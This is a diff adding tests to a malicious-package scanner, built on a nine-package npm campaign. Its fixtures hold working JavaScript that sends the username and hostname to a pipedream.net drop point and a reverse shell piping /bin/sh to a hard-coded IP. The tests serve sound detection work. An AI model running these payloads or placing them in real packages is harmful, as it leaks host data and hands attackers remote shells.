@@ -10436,6 +10436,71 @@ class TestEveryVerbOnOneResourceIsNotEveryResource:
         assert "clusterrole" in found[0].location.path.lower()
 
 
+class TestNinePackagesPublishedInOneWeek:
+    """`elf-stats-*`, npm, December 2025: nine packages under festive random
+    names -- `candystriped-muffin-773`, `flickering-fir-572`,
+    `sprucey-fireplace-355` -- each a dozen lines long. Cordon reported nothing
+    on any of them, for three separate reasons.
+    """
+
+    def test_a_command_passed_by_name_is_still_a_command(self, tmp_path) -> None:
+        """One line of indirection defeated the embedded-command extractor. It
+        reads string literals from inside the call's arguments, so a command
+        built above and handed over by name was examined by nobody: the
+        JavaScript rules see `exec` given a variable, and the shell rules never
+        run because the file is JavaScript."""
+        (tmp_path / "index.js").write_text(
+            'const { exec } = require("child_process");\n'
+            "const command = `\n"
+            'curl -X POST "https://abc123.m.pipedream.net/$(whoami)/$(hostname)/" \\\n'
+            "-s -o /dev/null\n"
+            "`;\n"
+            "exec(command, (error, stdout, stderr) => { if (error) { return; } });\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.EXFIL.DROP_POINT.001" in blocking(tmp_path)
+
+    def test_the_same_command_written_inline(self, tmp_path) -> None:
+        """The control: indirection is the only difference."""
+        (tmp_path / "index.js").write_text(
+            'const { exec } = require("child_process");\n'
+            'exec(`curl -X POST "https://abc123.m.pipedream.net/$(whoami)/$(hostname)/"`);\n',
+            encoding="utf-8",
+        )
+        assert "SUSPECT.EXFIL.DROP_POINT.001" in blocking(tmp_path)
+
+    def test_a_shell_piped_to_a_socket(self, tmp_path) -> None:
+        """`flickering-fir-572` and `sprucey-fireplace-355` are reverse shells.
+        A socket was `egress` and a shell was `spawn`, and no rule said what the
+        pair of them is."""
+        (tmp_path / "index.js").write_text(
+            'const net = require("net");\n'
+            'const { spawn } = require("child_process");\n'
+            "const client = new net.Socket();\n"
+            'client.connect(55555, "82.65.157.141", () => {\n'
+            '  const shell = spawn("/bin/sh", []);\n'
+            "  client.pipe(shell.stdin);\n"
+            "  shell.stdout.pipe(client);\n"
+            "});\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.REVERSE_SHELL.001" in blocking(tmp_path)
+
+    def test_a_client_talking_to_a_named_host_is_not(self, tmp_path) -> None:
+        """The control, and the reason the rule wants a literal address: a
+        client library ships its vendor's endpoint, and `ws`, `socket.io`,
+        `redis`, `mongodb` and `ssh2` all open sockets and start processes for a
+        living."""
+        (tmp_path / "client.js").write_text(
+            'const net = require("net");\n'
+            'const { spawn } = require("child_process");\n'
+            'const client = net.connect(443, "api.example.com");\n'
+            'const worker = spawn("node", ["worker.js"]);\n',
+            encoding="utf-8",
+        )
+        assert "MALWARE.REVERSE_SHELL.001" not in flagged(tmp_path)
+
+
 class TestAFileWrittenOnWindows:
     """A carriage return is not a character a rule should have an opinion about.
 
